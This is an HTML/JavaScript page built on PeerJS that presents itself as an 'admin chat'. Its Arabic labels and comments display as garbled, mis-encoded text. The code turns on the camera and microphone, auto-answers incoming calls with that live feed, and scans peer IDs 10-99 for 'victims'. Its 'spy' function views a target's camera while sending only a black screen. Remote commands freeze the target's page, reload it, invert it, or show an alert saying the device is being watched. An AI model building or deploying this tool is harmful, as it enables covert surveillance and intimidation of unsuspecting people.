<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTIMATE ADMIN CHAT</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        /* === ØªØµÙ…ÙŠÙ… Ø§Ù„ØµÙØ­Ø© === */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background: #000; color: #0f0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        #loginScreen { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1; }
        .card { border: 2px solid #0f0; padding: 30px; background: #050505; text-align: center; box-shadow: 0 0 20px #0f0; border-radius: 10px; width: 90%; max-width: 400px; }
        .my-id { font-size: 2.5rem; font-weight: bold; margin: 20px 0; color: white; text-shadow: 0 0 10px #0f0; }
        
        button { width: 100%; padding: 15px; background: #003300; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; margin-top: 10px; font-size: 1.1rem; }
        button:hover { background: #0f0; color: black; }

        input { width: 100%; padding: 10px; background: #111; border: 1px solid #0f0; color: white; text-align: center; font-size: 1.1rem; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ */
        #mainInterface { display: none; height: 100%; flex-direction: column; z-index: 1; }
        .video-container { flex: 1; display: flex; border-bottom: 2px solid #0f0; }
        .vid-box { flex: 1; border-right: 1px solid #0f0; position: relative; background: #111; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .label { position: absolute; bottom: 10px; left: 10px; background: black; padding: 5px; border: 1px solid #0f0; color: white; }

        /* ========================================= */
        /* ğŸ”¥ğŸ”¥ Ø§Ù„Ø²Ø± Ø§Ù„ÙˆØ§Ø¶Ø­ Ø¬Ø¯Ø§Ù‹ ğŸ”¥ğŸ”¥ */
        /* ========================================= */
        #SUPER_ADMIN_BTN {
            position: fixed;
            top: 10px;
            right: 10px; /* ÙÙŠ Ø£Ø¹Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† */
            background: red;
            color: white;
            padding: 15px 25px;
            font-size: 1.2rem;
            font-weight: bold;
            border: 3px solid white;
            border-radius: 10px;
            z-index: 999999; /* ÙÙˆÙ‚ ÙƒÙ„ Ø´ÙŠØ¡ */
            cursor: pointer;
            box-shadow: 0 0 20px red;
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        /* Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø§Ù„ÙƒØ¨ÙŠØ±Ø© */
        #adminPanelModal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 1000000;
            flex-direction: column; align-items: center; justify-content: flex-start;
            padding-top: 50px;
        }
        
        .panel-content {
            background: #111; border: 2px solid red; width: 90%; max-width: 600px;
            padding: 20px; border-radius: 10px; max-height: 80vh; overflow-y: auto;
        }

        .panel-header { display: flex; justify-content: space-between; border-bottom: 1px solid red; padding-bottom: 10px; margin-bottom: 20px; }
        .section-title { color: yellow; margin: 15px 0 5px 0; border-bottom: 1px dashed #555; }

        /* Ø£Ø²Ø±Ø§Ø± Ø§Ù„ØªØ­ÙƒÙ… */
        .cmd-btn { background: #330000; color: red; border: 1px solid red; margin-bottom: 5px; }
        .cmd-btn:hover { background: red; color: white; }
        
        .user-list-item { background: #222; padding: 10px; margin-bottom: 5px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #333; }

        /* ØªØ£Ø«ÙŠØ±Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ© */
        body.hacked { filter: invert(1); }
        body.frozen { pointer-events: none; opacity: 0.5; }

    </style>
</head>
<body>

    <!-- ğŸ”¥ Ø§Ù„Ø²Ø± Ø§Ù„Ø°ÙŠ Ù„Ø§ ÙŠØ®ØªÙÙŠ Ø£Ø¨Ø¯Ø§Ù‹ ğŸ”¥ -->
    <button id="SUPER_ADMIN_BTN" onclick="togglePanel()">ğŸ‘‘ Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù†</button>

    <!-- ğŸ› ï¸ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø£Ø¯Ù…Ù† -->
    <div id="adminPanelModal">
        <div class="panel-content">
            <div class="panel-header">
                <h2 style="color:red;">ğŸ˜ˆ CONTROL CENTER</h2>
                <button onclick="togglePanel()" style="width:auto; padding:5px 15px; background:white; color:black; margin:0;">Ø¥ØºÙ„Ø§Ù‚ X</button>
            </div>

            <div class="section-title">ğŸ“¡ Ø§Ù„Ø±Ø§Ø¯Ø§Ø± (ÙƒØ´Ù Ø§Ù„Ù…ØªØµÙ„ÙŠÙ†)</div>
            <button onclick="startRadar()" id="radarBtn" style="background:blue; color:white; border-color:cyan;">ğŸ” ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨Ø­Ø« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ (10-99)</button>
            
            <div class="section-title">ğŸ“‹ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¶Ø­Ø§ÙŠØ§</div>
            <div id="victimList" style="color:#777; text-align:center;">Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¶Ø­Ø§ÙŠØ§ Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†...</div>

            <div class="section-title">âš¡ Ø£ÙˆØ§Ù…Ø± Ø§Ù„ØªØ­ÙƒÙ… (ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† Ù…ØªØµÙ„Ø§Ù‹)</div>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
                <button class="cmd-btn" onclick="sendCommand('KICK')">ğŸšª Ø·Ø±Ø¯ (Kick)</button>
                <button class="cmd-btn" onclick="sendCommand('FREEZE')">â„ï¸ ØªØ¬Ù…ÙŠØ¯ (Freeze)</button>
                <button class="cmd-btn" onclick="sendCommand('ALERT')">ğŸ“¢ Ø±Ø³Ø§Ù„Ø© Ù…Ø±Ø¹Ø¨Ø©</button>
                <button class="cmd-btn" onclick="sendCommand('HACK')">ğŸ¨ ÙˆØ¶Ø¹ Ø§Ù„Ù‡Ø§ÙƒØ±</button>
            </div>
        </div>
    </div>

    <!-- Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
    <div id="loginScreen">
        <div class="card">
            <h1>SYSTEM LOGIN</h1>
            <p>Ø±Ù‚Ù…Ùƒ Ø§Ù„Ø®Ø§Øµ (ID):</p>
            <div class="my-id" id="myIdDisplay">--</div>
            <input type="number" id="manualInput" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¶Ø­ÙŠØ©">
            <button onclick="connectManual()">Ø§ØªØµØ§Ù„ ÙŠØ¯ÙˆÙŠ</button>
        </div>
    </div>

    <!-- Ø´Ø§Ø´Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ -->
    <div id="mainInterface">
        <div class="video-container">
            <div class="vid-box">
                <video id="localVideo" autoplay muted></video>
                <div class="label">Ø£Ù†Øª (Ø§Ù„Ø£Ø¯Ù…Ù†)</div>
            </div>
            <div class="vid-box">
                <video id="remoteVideo" autoplay></video>
                <div class="label">Ø§Ù„Ø¶Ø­ÙŠØ©</div>
            </div>
        </div>
        <button onclick="location.reload()" style="background:red; color:white;">ğŸ”´ Ù‚Ø·Ø¹ Ø§Ù„Ø§ØªØµØ§Ù„</button>
    </div>

    <script>
        // 1. ØªÙˆÙ„ÙŠØ¯ Ø±Ù‚Ù… ØµØºÙŠØ± (10-99) Ù„ØªØ³Ù‡ÙŠÙ„ Ø§Ù„Ø¨Ø­Ø«
        const myId = Math.floor(Math.random() * (99 - 10 + 1) + 10).toString();
        document.getElementById('myIdDisplay').innerText = myId;

        let peer = new Peer(myId);
        let conn, call, localStream;
        let detectedVictims = JSON.parse(localStorage.getItem('victims') || "[]");

        // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
            localStream = stream;
            document.getElementById('localVideo').srcObject = stream;
        });

        // --- PEERJS EVENTS ---
        peer.on('open', id => console.log('My ID:', id));

        peer.on('connection', c => {
            conn = c;
            setupData();
            addVictim(conn.peer);
        });

        peer.on('call', incoming => {
            incoming.answer(localStream);
            call = incoming;
            call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
            addVictim(incoming.peer);
            showVideoScreen();
        });

        // --- ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø£Ø¯Ù…Ù† ---

        // ÙØªØ­/ØºÙ„Ù‚ Ø§Ù„Ù„ÙˆØ­Ø©
        function togglePanel() {
            let p = document.getElementById('adminPanelModal');
            p.style.display = (p.style.display === 'flex') ? 'none' : 'flex';
            renderVictims();
        }

        // Ø§Ù„Ø±Ø§Ø¯Ø§Ø± (Ø§Ù„Ø¨Ø­Ø« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ)
        let isScanning = false;
        let scanIndex = 10;

        function startRadar() {
            if(isScanning) return;
            isScanning = true;
            document.getElementById('radarBtn').innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø³Ø­... (Ø§Ù†ØªØ¸Ø±)";
            scanLoop();
        }

        function scanLoop() {
            if(!isScanning) return;
            if(scanIndex > 99) scanIndex = 10;

            let target = scanIndex.toString();
            if(target !== myId) {
                let test = peer.connect(target);
                test.on('open', () => {
                    isScanning = false;
                    document.getElementById('radarBtn').innerText = "âœ… ØªÙ… ÙƒØ´Ù Ù‡Ø¯Ù: " + target;
                    addVictim(target);
                    alert("ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø¬Ù‡Ø§Ø² Ø±Ù‚Ù…: " + target);
                    connectTo(target);
                });
                
                setTimeout(() => {
                    if(isScanning && !test.open) { test.close(); scanIndex++; scanLoop(); }
                }, 100);
            } else {
                scanIndex++; scanLoop();
            }
        }

        // Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¶Ø­Ø§ÙŠØ§
        function addVictim(id) {
            if(!detectedVictims.includes(id)) {
                detectedVictims.push(id);
                localStorage.setItem('victims', JSON.stringify(detectedVictims));
                renderVictims();
            }
        }

        function renderVictims() {
            let div = document.getElementById('victimList');
            if(detectedVictims.length === 0) return;
            div.innerHTML = '';
            detectedVictims.forEach(id => {
                div.innerHTML += `
                    <div class="user-list-item">
                        <span style="color:white; font-weight:bold;">ID: ${id}</span>
                        <div>
                            <button style="padding:5px; width:auto; font-size:0.8rem; background:#330;" onclick="spyOn('${id}')">ğŸ‘ï¸ ØªØ¬Ø³Ø³</button>
                            <button style="padding:5px; width:auto; font-size:0.8rem; background:#003;" onclick="connectTo('${id}')">ğŸ“ Ø§ØªØµØ§Ù„</button>
                        </div>
                    </div>
                `;
            });
        }

        // Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø¹Ø§Ø¯ÙŠ
        function connectManual() {
            let id = document.getElementById('manualInput').value;
            if(id) connectTo(id);
        }

        function connectTo(id) {
            togglePanel();
            conn = peer.connect(id);
            conn.on('open', () => {
                setupData();
                call = peer.call(id, localStream);
                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
                showVideoScreen();
            });
        }

        // Ø§Ù„ØªØ¬Ø³Ø³ (Ø´Ø§Ø´Ø© Ø³ÙˆØ¯Ø§Ø¡)
        function spyOn(id) {
            togglePanel();
            let canvas = document.createElement('canvas'); canvas.width=100; canvas.height=100;
            let ctx = canvas.getContext('2d'); ctx.fillStyle="black"; ctx.fillRect(0,0,100,100);
            let blackStream = canvas.captureStream(30);
            // ØµÙˆØª ØµØ§Ù…Øª
            let ac = new AudioContext(); let dest = ac.createMediaStreamDestination();
            blackStream.addTrack(dest.stream.getAudioTracks()[0]);

            call = peer.call(id, blackStream);
            call.on('stream', rs => {
                document.getElementById('remoteVideo').srcObject = rs; // Ù†Ø±Ù‰ Ø§Ù„Ø¶Ø­ÙŠØ©
                document.getElementById('localVideo').srcObject = blackStream; // Ù†Ø­Ù† Ø´Ø§Ø´Ø© Ø³ÙˆØ¯Ø§Ø¡
                showVideoScreen();
            });
        }

        // Ø£ÙˆØ§Ù…Ø± Ø§Ù„ØªØ­ÙƒÙ…
        function setupData() {
            conn.on('data', data => {
                if(data.type === 'CMD') executeCmd(data.action);
            });
        }

        function sendCommand(action) {
            if(conn && conn.open) {
                conn.send({type: 'CMD', action: action});
                alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…Ø±: " + action);
            } else {
                alert("ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† Ù…ØªØµÙ„Ø§Ù‹ Ø¨Ø´Ø®Øµ Ø£ÙˆÙ„Ø§Ù‹!");
            }
        }

        // ØªÙ†ÙÙŠØ° Ø§Ù„Ø£ÙˆØ§Ù…Ø± (Ø¹Ù†Ø¯ Ø§Ù„Ø¶Ø­ÙŠØ©)
        function executeCmd(action) {
            if(action === 'KICK') location.reload();
            if(action === 'FREEZE') document.body.classList.add('frozen');
            if(action === 'HACK') document.body.classList.add('hacked');
            if(action === 'ALERT') alert("âš ï¸ SYSTEM ERROR: YOUR DEVICE IS WATCHED!");
        }

        function showVideoScreen() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('mainInterface').style.display = 'flex';
        }

        renderVictims();
    </script>
</body>
</html>
